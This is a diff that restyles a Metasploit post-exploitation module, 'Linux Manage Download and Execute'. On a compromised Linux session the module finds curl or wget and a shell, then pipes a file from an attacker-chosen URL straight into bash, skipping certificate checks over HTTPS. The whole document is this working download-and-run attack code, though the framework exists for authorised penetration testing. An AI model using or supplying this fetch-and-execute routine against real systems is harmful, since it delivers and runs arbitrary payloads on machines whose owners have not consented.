@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,59 +8,56 @@ require 'msf/core'
 require 'rex'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Linux::System
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Linux Manage Download and Execute',
-      'Description'   => %q{
-        This module downloads and runs a file with bash. It first tries to uses curl as
-        its HTTP client and then wget if it's not found. Bash found in the PATH is used
-        to execute the file.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
-          'Joshua D. Abraham <jabra[at]praetorian.com>',
-        ],
-      'Platform'      => ['linux'],
-      'SessionTypes'  => ['shell', 'meterpreter']
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Linux Manage Download and Execute',
+                      'Description'   => %q(
+                        This module downloads and runs a file with bash. It first tries to uses curl as
+                        its HTTP client and then wget if it's not found. Bash found in the PATH is used
+                        to execute the file.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        =>
+                        [
+                          'Joshua D. Abraham <jabra[at]praetorian.com>'
+                        ],
+                      'Platform'      => ['linux'],
+                      'SessionTypes'  => ['shell', 'meterpreter']))
 
     register_options(
       [
         OptString.new('URL', [true, 'Full URL of file to download.'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def cmd_exec_vprint(cmd)
     vprint_status("Executing: #{cmd}")
     output = cmd_exec(cmd)
-    if output.length > 0
-      vprint_status("#{output}")
-    end
-    return
+    vprint_status(output.to_s) unless output.empty?
+    nil
   end
 
   def exists_exe?(exe)
     vprint_status "Searching for #{exe} in the current $PATH..."
     path = get_env("PATH")
-    if path.nil? or path.empty?
+    if path.nil? || path.empty?
       return false
       vprint_error "No local $PATH set!"
     else
       vprint_status "$PATH is #{path.strip!}"
     end
 
-    path.split(":").each{ |p|
+    path.split(":").each do |p|
       full_path = p + "/" + exe
       vprint_status "Searching for '#{full_path}' ..."
       return true if file_exist?(full_path)
-    }
+    end
 
-    return false
+    false
   end
 
   def search_http_client
@@ -76,7 +74,7 @@ class MetasploitModule < Msf::Post
     if exists_exe?("wget")
       print_good("wget available, using it")
       @http_client = "wget"
-      @stdout_option =  "-O-"
+      @stdout_option = "-O-"
       @ssl_option = "--no-check-certificate"
       return
     end
@@ -101,23 +99,22 @@ class MetasploitModule < Msf::Post
   def run
     search_http_client
 
-    if not @http_client
+    unless @http_client
       print_warning("neither curl nor wget available in the $PATH, aborting...")
       return
     end
 
     search_shell
 
-    if not @shell
+    unless @shell
       print_warning("neither bash nor sh available in the $PATH, aborting...")
       return
     end
 
-    if datastore['URL'].match(%r{^https://})
+    if datastore['URL'] =~ %r{^https://}
       cmd_exec_vprint("#{@http_client} #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     else
       cmd_exec_vprint("#{@http_client} #{@stdout_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     end
   end
-
 end
